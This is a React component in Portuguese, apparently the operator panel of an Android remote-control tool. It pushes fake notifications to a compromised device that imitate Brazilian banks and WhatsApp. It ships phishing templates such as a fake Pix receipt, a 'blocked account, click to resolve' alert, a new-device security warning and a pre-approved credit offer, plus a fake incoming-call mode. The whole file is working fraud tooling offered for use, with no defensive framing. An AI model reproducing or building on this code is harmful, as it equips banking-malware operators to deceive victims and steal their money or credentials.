import { useState } from 'react';
import useStore from '../../store/index.js';

const BANKS = [
  { id: 'itau',      label: 'Itaú',       color: '#EC7000', defaultTitle: 'Itaú Uniclass' },
  { id: 'nubank',    label: 'Nubank',     color: '#8A05BE', defaultTitle: 'Nubank' },
  { id: 'bradesco',  label: 'Bradesco',   color: '#CC092F', defaultTitle: 'Bradesco' },
  { id: 'caixa',     label: 'Caixa',      color: '#005CA9', defaultTitle: 'Caixa Econômica' },
  { id: 'santander', label: 'Santander',  color: '#EC0000', defaultTitle: 'Santander' },
  { id: 'inter',     label: 'Inter',      color: '#FF7A00', defaultTitle: 'Banco Inter' },
  { id: 'c6',        label: 'C6 Bank',    color: '#242424', defaultTitle: 'C6 Bank' },
  { id: 'whatsapp',  label: 'WhatsApp',   color: '#25D366', defaultTitle: 'WhatsApp' },
  { id: 'custom',    label: 'Personalizado', color: '#3b7af0', defaultTitle: '' },
];

const TEMPLATES = {
  pix_in:     { title: 'Pix recebido', text: 'Você recebeu uma transferência via Pix de R$ 1.500,00. Acesse para confirmar.' },
  pix_out:    { title: 'Transferência agendada', text: 'Uma transferência de R$ 3.200,00 foi agendada. Clique para validar.' },
  blocked:    { title: 'Conta temporariamente bloqueada', text: 'Detectamos uma atividade suspeita em sua conta. Clique para resolver.' },
  token:      { title: 'Token de acesso', text: 'Seu código de acesso é: 847291. Válido por 3 minutos.' },
  limit:      { title: 'Limite de crédito disponível', text: 'Você tem R$ 15.000 de crédito pré-aprovado. Toque para contratar.' },
  security:   { title: 'Alerta de segurança', text: 'Novo dispositivo acessou sua conta. Não reconhece? Clique aqui.' },
  whatsapp:   { title: 'Nova mensagem de voz', text: 'Áudio recebido de +55 (11) 9 8765-4321 • 0:12' },
};

export default function FakeNotifPanel({ deviceId, onBack, sendCmd }) {
  const notifications = useStore(s => s.deviceNotifications);

  const [bank, setBank]         = useState('itau');
  const [title, setTitle]       = useState('Itaú Uniclass');
  const [text, setText]         = useState(TEMPLATES.pix_in.text);
  const [iconUrl, setIconUrl]   = useState('');
  const [isCall, setIsCall]     = useState(false);
  const [sound, setSound]       = useState(true);
  const [sending, setSending]   = useState(false);
  const [toast, setToast]       = useState(null);

  function pickBank(id) {
    setBank(id);
    const b = BANKS.find(x => x.id === id);
    if (b?.defaultTitle) setTitle(b.defaultTitle);
  }

  function applyTemplate(key) {
    const t = TEMPLATES[key];
    if (!t) return;
    setTitle(t.title);
    setText(t.text);
  }

  function showToast(msg, col = '#4ade80') {
    setToast({ msg, col });
    setTimeout(() => setToast(null), 2500);
  }

  function sendNotif() {
    if (!title.trim()) { showToast('Título obrigatório', '#f87171'); return; }
    setSending(true);
    sendCmd('FAKE_NOTIFICATION', {
      title:    title.trim(),
      message:  text.trim(),
      text:     text.trim(),
      bank,
      icon:     bank,
      iconUrl:  iconUrl.trim(),
      isCall,
      sound,
      actionOnTap: isCall ? 'fake_call' : 'open',
    });
    showToast(isCall ? '📞 Notificação de chamada enviada!' : '🔔 Notificação enviada!');
    setTimeout(() => setSending(false), 1500);
  }

  function dismissAll() {
    sendCmd('DISMISS_FAKE_NOTIFICATION', {});
    showToast('Notificações dispensadas', '#94a3b8');
  }

  const selectedBank = BANKS.find(b => b.id === bank) || BANKS[0];

  return (
    <div className="fade-up">
      {toast && (
        <div style={{
          position: 'fixed', top: 68, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(6,4,12,.97)', border: `1px solid ${toast.col}44`,
          borderRadius: 8, padding: '6px 14px', zIndex: 9999, pointerEvents: 'none',
          boxShadow: `0 0 20px ${toast.col}22`,
        }}>
          <span style={{ color: toast.col, fontSize: 11, fontWeight: 700 }}>{toast.msg}</span>
        </div>
      )}

      {/* Header */}
      <div className="row-sb mb12">
        <div>
          <div style={{ fontWeight: 800, fontSize: 14, color: '#60a5fa' }}>🔔 FAKE NOTIFICATION</div>
          <div className="txt-xs txt-dim mt2">Banner flutuante tipo Heads-Up na tela</div>
        </div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      {/* Preview card */}
      <div style={{
        margin: '0 0 12px', padding: '10px 12px', borderRadius: 14,
        background: '#1A2332',
        border: `1px solid ${isCall ? '#00F0FF55' : '#3b7af055'}`,
        boxShadow: '0 4px 20px rgba(0,0,0,.4)',
      }}>
        <div style={{ fontSize: 10, color: '#64748B', marginBottom: 4 }}>
          Preview — como aparecerá no dispositivo
        </div>
        <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
          <div style={{
            width: 36, height: 36, borderRadius: 18, flexShrink: 0,
            background: `${selectedBank.color}22`,
            border: `1px solid ${selectedBank.color}55`,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            fontSize: 13, fontWeight: 800, color: selectedBank.color,
          }}>
            {selectedBank.label.charAt(0)}
          </div>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontSize: 10, color: '#94A3B8', marginBottom: 2 }}>
              {selectedBank.defaultTitle || selectedBank.label}
              {isCall ? ' • Chamada de Voz' : ''} • agora
            </div>
            <div style={{ fontSize: 13, fontWeight: 700, color: '#fff', marginBottom: 2 }}>
              {title || 'Título da notificação'}
            </div>
            <div style={{ fontSize: 12, color: '#CBD5E1', lineClamp: 2 }}>
              {text || 'Mensagem da notificação'}
            </div>
          </div>
        </div>
        {isCall && (
          <div style={{ display: 'flex', gap: 8, marginTop: 10 }}>
            <div style={{
              flex: 1, padding: '7px 0', textAlign: 'center',
              borderRadius: 20, background: '#E53E3E',
              fontSize: 11, fontWeight: 700, color: '#fff',
            }}>
              🚫 RECUSAR
            </div>
            <div style={{
              flex: 1, padding: '7px 0', textAlign: 'center',
              borderRadius: 20, background: '#38A169',
              fontSize: 11, fontWeight: 700, color: '#fff',
            }}>
              📞 ATENDER
            </div>
          </div>
        )}
      </div>

      {/* Bank selector */}
      <div className="card mb10">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>ÍCONE / BANCO</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          {BANKS.map(b => (
            <button key={b.id} onClick={() => pickBank(b.id)} style={{
              padding: '5px 12px', borderRadius: 20, fontSize: 11, fontWeight: 700,
              cursor: 'pointer',
              border: `1px solid ${b.id === bank ? b.color : 'rgba(255,255,255,.12)'}`,
              background: b.id === bank ? `${b.color}22` : 'rgba(255,255,255,.04)',
              color: b.id === bank ? b.color : 'var(--text2)',
            }}>
              {b.label}
            </button>
          ))}
        </div>
      </div>

      {/* Templates */}
      <div className="card mb10">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>TEMPLATES RÁPIDOS</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          {Object.entries({
            pix_in:   'Pix recebido',
            pix_out:  'Transferência',
            blocked:  'Conta bloqueada',
            token:    'Token de acesso',
            limit:    'Limite aprovado',
            security: 'Alerta segurança',
            whatsapp: 'Mensagem de voz',
          }).map(([k, label]) => (
            <button key={k} onClick={() => applyTemplate(k)} className="btn btn-ghost btn-xs"
              style={{ fontSize: 10 }}>
              {label}
            </button>
          ))}
        </div>
      </div>

      {/* Content form */}
      <div className="card mb10">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>CONTEÚDO</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
          <div>
            <div className="txt-xs txt-dim mb4">Título *</div>
            <input className="input" value={title} onChange={e => setTitle(e.target.value)}
              placeholder="ex: Pix recebido" />
          </div>
          <div>
            <div className="txt-xs txt-dim mb4">Mensagem</div>
            <textarea
              className="input"
              style={{ resize: 'vertical', minHeight: 60, fontFamily: 'var(--font)', fontSize: 12 }}
              value={text}
              onChange={e => setText(e.target.value)}
              placeholder="ex: Você recebeu R$ 1.500,00 via Pix..."
            />
          </div>
          <div>
            <div className="txt-xs txt-dim mb4">URL do Ícone Personalizado (opcional)</div>
            <input className="input" value={iconUrl} onChange={e => setIconUrl(e.target.value)}
              placeholder="https://..." />
          </div>
        </div>
      </div>

      {/* Options */}
      <div className="card mb12">
        <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>OPÇÕES</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          <div className="toggle-wrap" style={{ padding: 0 }}>
            <span className="toggle-label">
              <span style={{ marginRight: 6 }}>📞</span>
              Modo Chamada (mostra ATENDER / RECUSAR)
            </span>
            <div className={`toggle ${isCall ? 'on' : ''}`}
              onClick={() => setIsCall(v => !v)} />
          </div>
          <div className="toggle-wrap" style={{ padding: 0 }}>
            <span className="toggle-label">
              <span style={{ marginRight: 6 }}>🔔</span>
              Som e Vibração
            </span>
            <div className={`toggle ${sound ? 'on' : ''}`}
              onClick={() => setSound(v => !v)} />
          </div>
        </div>
      </div>

      {/* Send buttons */}
      <div className="grid g2 mb12">
        <button
          className="btn btn-block"
          style={{
            background: 'rgba(96,165,250,.15)', border: '1px solid #60a5fa55',
            color: '#60a5fa', fontWeight: 800,
          }}
          disabled={sending}
          onClick={sendNotif}>
          🔔 ENVIAR NOTIFICAÇÃO
        </button>
        <button className="btn btn-ghost btn-block" onClick={dismissAll}>
          ✕ DISPENSAR
        </button>
      </div>

      {/* Log */}
      {notifications.length > 0 && (
        <div className="card">
          <div className="txt-xs txt-dim mb8" style={{ letterSpacing: 1 }}>HISTÓRICO</div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 5, maxHeight: 220, overflowY: 'auto' }}>
            {notifications.slice(0, 15).map((n, i) => (
              <div key={i} style={{
                display: 'flex', alignItems: 'center', gap: 8,
                padding: '6px 10px', borderRadius: 8,
                background: 'rgba(255,255,255,.03)',
                borderLeft: `3px solid ${n.is_call ? '#00F0FF' : '#3b7af0'}`,
              }}>
                <span style={{ fontSize: 14 }}>{n.is_call ? '📞' : '🔔'}</span>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text)' }}
                    className="txt-truncate">
                    {n.title}
                  </div>
                  {n.message && (
                    <div style={{ fontSize: 10, color: 'var(--text3)' }} className="txt-truncate">
                      {n.message}
                    </div>
                  )}
                </div>
                <div style={{ fontSize: 10, color: 'var(--text3)', flexShrink: 0 }}>
                  {n.ts ? new Date(n.ts).toLocaleTimeString() : ''}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div style={{ height: 24 }} />
    </div>
  );
}
